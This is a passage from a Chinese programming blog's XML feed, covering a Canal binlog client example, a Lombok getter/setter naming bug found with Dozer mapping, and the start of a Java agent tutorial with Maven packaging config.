class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> canal.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.otter.canal.client.CanalConnector;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.otter.canal.client.CanalConnectors;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.otter.canal.protocol.CanalEntry;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.otter.canal.protocol.Message;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> tt</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleCanalClientExample</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建链接</span></span><br><span class="line">        CanalConnector connector = CanalConnectors.newSingleConnector(<span class="keyword">new</span> InetSocketAddress(<span class="string">"192.168.1.101"</span>,</span><br><span class="line">                <span class="number">11111</span>), <span class="string">"example"</span>, <span class="string">""</span>, <span class="string">""</span>);</span><br><span class="line">        <span class="keyword">int</span> batchSize = <span class="number">1000</span>;</span><br><span class="line">        <span class="keyword">int</span> emptyCount = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            connector.connect();</span><br><span class="line">            connector.subscribe(<span class="string">".*\\..*"</span>);</span><br><span class="line">            connector.rollback();</span><br><span class="line">            <span class="keyword">int</span> totalEmptyCount = <span class="number">120</span>;</span><br><span class="line">            <span class="keyword">boolean</span> flag = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">while</span> (flag || emptyCount &lt; totalEmptyCount) &#123;</span><br><span class="line">                Message message = connector.getWithoutAck(batchSize); <span class="comment">// 获取指定数量的数据</span></span><br><span class="line">                <span class="keyword">long</span> batchId = message.getId();</span><br><span class="line">                <span class="keyword">int</span> size = message.getEntries().size();</span><br><span class="line">                <span class="keyword">if</span> (batchId == -<span class="number">1</span> || size == <span class="number">0</span>) &#123;</span><br><span class="line">                    emptyCount++;</span><br><span class="line">                    System.out.println(<span class="string">"empty count : "</span> + emptyCount);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    emptyCount = <span class="number">0</span>;</span><br><span class="line">                    <span class="comment">// System.out.printf("message[batchId=%s,size=%s] \n", batchId, size);</span></span><br><span class="line">                    printEntry(message.getEntries());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                connector.ack(batchId); <span class="comment">// 提交确认</span></span><br><span class="line">                <span class="comment">// connector.rollback(batchId); // 处理失败, 回滚数据</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">"empty too many times, exit"</span>);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            connector.disconnect();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printEntry</span><span class="params">(List&lt;CanalEntry.Entry&gt; entrys)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (CanalEntry.Entry entry : entrys) &#123;</span><br><span class="line">            <span class="keyword">if</span> (entry.getEntryType() == CanalEntry.EntryType.TRANSACTIONBEGIN || entry.getEntryType() == CanalEntry.EntryType.TRANSACTIONEND) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            CanalEntry.RowChange rowChage = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                rowChage = CanalEntry.RowChange.parseFrom(entry.getStoreValue());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"ERROR ## parser of eromanga-event has an error , data:"</span> + entry.toString(),</span><br><span class="line">                        e);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            CanalEntry.EventType eventType = rowChage.getEventType();</span><br><span class="line">            System.out.println(String.format(<span class="string">"================&gt; binlog[%s:%s] , name[%s,%s] , eventType : %s"</span>,</span><br><span class="line">                    entry.getHeader().getLogfileName(), entry.getHeader().getLogfileOffset(),</span><br><span class="line">                    entry.getHeader().getSchemaName(), entry.getHeader().getTableName(),</span><br><span class="line">                    eventType));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (CanalEntry.RowData rowData : rowChage.getRowDatasList()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (eventType == CanalEntry.EventType.DELETE) &#123;</span><br><span class="line">                    printColumn(rowData.getBeforeColumnsList());</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (eventType == CanalEntry.EventType.INSERT) &#123;</span><br><span class="line">                    printColumn(rowData.getAfterColumnsList());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">"-------&gt; before"</span>);</span><br><span class="line">                    printColumn(rowData.getBeforeColumnsList());</span><br><span class="line">                    System.out.println(<span class="string">"-------&gt; after"</span>);</span><br><span class="line">                    printColumn(rowData.getAfterColumnsList());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printColumn</span><span class="params">(List&lt;CanalEntry.Column&gt; columns)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (CanalEntry.Column column : columns) &#123;</span><br><span class="line">            System.out.println(column.getName() + <span class="string">" : "</span> + column.getValue() + <span class="string">"    update="</span> + column.getUpdated());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>快速开始到这里就结束了。</p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> canal </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[记一次lombok的问题]]></title>
      <url>/2018/lombok-quesion-1/</url>
      <content type="html"><![CDATA[<h2 id="一、案发现场"><a href="#一、案发现场" class="headerlink" title="一、案发现场"></a>一、案发现场</h2><p>此问题的案发现场是测试环境，为了减少不必要的类，我们这里用一个简单的例子进行模拟。</p>
<p>lombok version:1.16.14</p>
<p>jdk version:1.8</p>
<p>上代码：<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">├─src</span><br><span class="line">│  ├─main</span><br><span class="line">│  │  ├─java</span><br><span class="line">│  │  │  └─org</span><br><span class="line">│  │  │      └─jsbxyyx</span><br><span class="line">│  │  │          └─util</span><br><span class="line">│  │  │                  DozerUtil.java</span><br><span class="line">│  │  │</span><br><span class="line">│  │  └─resources</span><br><span class="line">│  └─test</span><br><span class="line">│      ├─java</span><br><span class="line">│      │  └─org</span><br><span class="line">│      │      └─jsbxyyx</span><br><span class="line">│      │          └─test</span><br><span class="line">│      │                  A.java</span><br><span class="line">│      │                  A1.java</span><br><span class="line">│      │                  DozerTest.java</span><br><span class="line">│      │</span><br><span class="line">│      └─resources</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">package org.jsbxyyx.util;</span><br><span class="line">import com.google.common.collect.Lists;</span><br><span class="line">import org.dozer.DozerBeanMapper;</span><br><span class="line">import java.util.Collection;</span><br><span class="line">import java.util.List;</span><br><span class="line">public class DozerUtil &#123;</span><br><span class="line">    private static DozerBeanMapper dozer = new DozerBeanMapper();</span><br><span class="line">    public static &lt;T&gt; T map(Object source, Class&lt;T&gt; destinationClass) &#123;</span><br><span class="line">        return dozer.map(source, destinationClass);</span><br><span class="line">    &#125;</span><br><span class="line">    public static &lt;T&gt; List&lt;T&gt; mapList(@SuppressWarnings(&quot;rawtypes&quot;) Collection sourceList, Class&lt;T&gt; destinationClass) &#123;</span><br><span class="line">        List&lt;T&gt; destinationList = Lists.newArrayList();</span><br><span class="line">        for (Object sourceObject : sourceList) &#123;</span><br><span class="line">            T destinationObject = dozer.map(sourceObject, destinationClass);</span><br><span class="line">            destinationList.add(destinationObject);</span><br><span class="line">        &#125;</span><br><span class="line">        return destinationList;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void map(Object source, Object destinationObject) &#123;</span><br><span class="line">        dozer.map(source, destinationObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">package org.jsbxyyx.test;</span><br><span class="line">import lombok.Getter;</span><br><span class="line">import lombok.Setter;</span><br><span class="line">import lombok.ToString;</span><br><span class="line">@Setter</span><br><span class="line">@Getter</span><br><span class="line">@ToString</span><br><span class="line">public class A &#123;</span><br><span class="line">	private String date;</span><br><span class="line">	private String vNum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">package org.jsbxyyx.test;</span><br><span class="line">import lombok.Getter;</span><br><span class="line">import lombok.Setter;</span><br><span class="line">import lombok.ToString;</span><br><span class="line">@Setter</span><br><span class="line">@Getter</span><br><span class="line">@ToString</span><br><span class="line">public class A1 &#123;</span><br><span class="line">	private String date;</span><br><span class="line">	private String vaNum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">package org.jsbxyyx.test;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">import org.jsbxyyx.util.DozerUtil;</span><br><span class="line">import org.junit.Assert;</span><br><span class="line">import org.junit.Test;</span><br><span class="line">public class DozerTest &#123;</span><br><span class="line">	</span><br><span class="line">	@Test</span><br><span class="line">	public void testA() throws Exception &#123;</span><br><span class="line">		Map&lt;String, String&gt; mapA = new HashMap&lt;&gt;();</span><br><span class="line">		mapA.put(&quot;date&quot;, &quot;2018-04-03&quot;);</span><br><span class="line">		mapA.put(&quot;vNum&quot;, &quot;123&quot;);</span><br><span class="line">		A a = DozerUtil.map(mapA, A.class);</span><br><span class="line">		Assert.assertEquals(&quot;123&quot;, a.getVNum());</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	@Test</span><br><span class="line">	public void testA1() throws Exception &#123;</span><br><span class="line">		Map&lt;String, String&gt; mapA1 = new HashMap&lt;&gt;();</span><br><span class="line">		mapA1.put(&quot;date&quot;, &quot;2018-04-03&quot;);</span><br><span class="line">		mapA1.put(&quot;vaNum&quot;, &quot;123&quot;);</span><br><span class="line">		A1 a = DozerUtil.map(mapA1, A1.class);</span><br><span class="line">		Assert.assertEquals(&quot;123&quot;, a.getVaNum());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="二、案件分析"><a href="#二、案件分析" class="headerlink" title="二、案件分析"></a>二、案件分析</h2><p>我们执行测试用testA和testA1发现</p>
<p>testA<strong>红了</strong></p>
<p>testA1<strong>绿了</strong></p>
<p>红了表示测试不通过啊。。。。。我们来看看为啥不通过。</p>
<p>问题的关键在于lombok生成getter，setter的时候没有按照JavaBean的规范来生成。导致testA就红了。</p>
<p>直接看反编译代码：</p>
<p>A.class</p>
<p><img src="http://wx1.sinaimg.cn/large/afc434bdgy1fq0hu1j13vj20ki0dyt96.jpg" alt="lombok a class"></p>
<p>我们再看看eclipse或者idea生成getter，setter是怎么样的</p>
<p><img src="http://wx1.sinaimg.cn/large/afc434bdgy1fq0hwgjfeqj20em0cimxo.jpg" alt="idea a class"></p>
<p>到了这里，我们发现问题了，lombok的getter，setter方法生成的不对。</p>
<h2 id="三、案件处理"><a href="#三、案件处理" class="headerlink" title="三、案件处理"></a>三、案件处理</h2><p>解决办法，去掉@Getter @Setter注解，用IDE生成，获取覆盖相应的getter/setter</p>
<h2 id="四、案件原理追溯"><a href="#四、案件原理追溯" class="headerlink" title="四、案件原理追溯"></a>四、案件原理追溯</h2><p>那么我们来分析一下，标准JavaBean是如何生成的。</p>
<p>官方文档：<a href="http://download.oracle.com/otn-pub/jcp/7224-javabeans-1.01-fr-spec-oth-JSpec/beans.101.pdf" target="_blank" rel="noopener">Java Beans specification</a></p>
<p>看到英语头大有木有。。。有木有。。。有木有。。。</p>
<p>好我们解释一下。</p>
<p>首先我们来描述一下JavaBean的规范</p>
<ol>
<li>Bean有一个默认的无参构造器</li>
<li>属性修饰符为private</li>
<li>实现接口java.io.Serializable</li>
<li>所有的访问器都以get开头，所有的修改器都用set，布尔类型访问器用is开头</li>
</ol>
<p>接下来我们来说一下javabean的getters/setters是如何生成，也就解决了问题。。</p>
<p>这个类Introspector.decapitalize()方法，可以获取到属性</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; Utility method to take a string and convert it to normal Java variable name capitalization.  This normally means converting the first character from upper case to lower case, but in the (unusual) special case when there is more than one character and both the first and second characters are upper case, we leave it alone.</span><br><span class="line">&gt;</span><br><span class="line">&gt; Thus &quot;FooBah&quot; becomes &quot;fooBah&quot; and </span><br><span class="line">&gt; &quot;X&quot; becomes &quot;x&quot;, </span><br><span class="line">&gt; but &quot;URL&quot; stays as &quot;URL&quot;.</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>意思就是第一个字母转大写后，如果第二个字母和转换后的第一个字母一样是大写，那么就返回原值。否则就返回首字母大写后的值。</p>
<p>问题就到这里啦。。。。。。。</p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> lombok </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[java agent开发]]></title>
      <url>/2018/java-agent-01/</url>
      <content type="html"><![CDATA[<p>java agent介绍</p>
<p>java agent是jvm插件或者叫做代理，她是运行在main方法之前，她内定的方法名称叫premain。</p>
<a id="more"></a>
<p>java agent 概述</p>
<p><img src="https://ws1.sinaimg.cn/large/afc434bdly1fplw4dc0lzj20j70ch74u.jpg" alt="https://ws1.sinaimg.cn/large/afc434bdly1fplw4dc0lzj20j70ch74u.jpg"></p>
<p>接下来我们进行开发</p>
<ol>
<li><p>实现premain方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.xxz;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentMain</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String args, Instrumentation inst)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">'hello java agent'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的这段代码就完成了java agent的第一步了</p>
</li>
<li><p>打包</p>
<p>这里我们使用maven的方式进行打包，请看下面的配置文件</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">  		<span class="tag">&lt;<span class="name">finalName</span>&gt;</span>java-agent<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">encoding</span>&gt;</span>utf-8<span class="tag">&lt;/<span class="name">encoding</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">addClasspath</span>&gt;</span>true<span class="tag">&lt;/<span class="name">addClasspath</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Premain-Class</span>&gt;</span>org.xxz.AgentMain<span class="tag">&lt;/<span class="name">Premain-Class</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="tag">&lt;/<span class="name">descriptorRef</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">id</span>&gt;</span>make-assembly<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>single<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用java agent</p>
<p>新建一个maven工程，打包然后运行</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar demo.jar -javaagent:/apps/java-agent.jar</span><br></pre></td></tr></table></figure>
<p>执行上面的运行命令后，在我们控制台输出时就会看到hello java agent的字样哦！！！</p>
</li>
</ol>
<p>看到这里就结束了吗？没有哦，我们来看一个小例子。。。。。。。</p>
<p>新建maven工程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">java-agent</span><br><span class="line">--src</span><br><span class="line">	--main</span><br><span class="line">		--java</span><br><span class="line">			--org.xxz</span><br><span class="line">				--AgentMain.java</span><br><span class="line">				--TimeInterceptor.java</span><br><span class="line">				--TraceTime.java</span><br><span class="line">		--resource</span><br><span class="line">	--test</span><br><span class="line">--pom.xml</span><br></pre></td></tr></table></figure>
<p>首先看看我们的pom.xml是如何配置的</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.xxz<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>java-agent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bytebuddy.version</span>&gt;</span>1.8.0<span class="tag">&lt;/<span class="name">bytebuddy.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">slf4j.version</span>&gt;</span>1.7.25<span class="tag">&lt;/<span class="name">slf4j.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.bytebuddy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>byte-buddy<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;bytebuddy.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;slf4j.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span 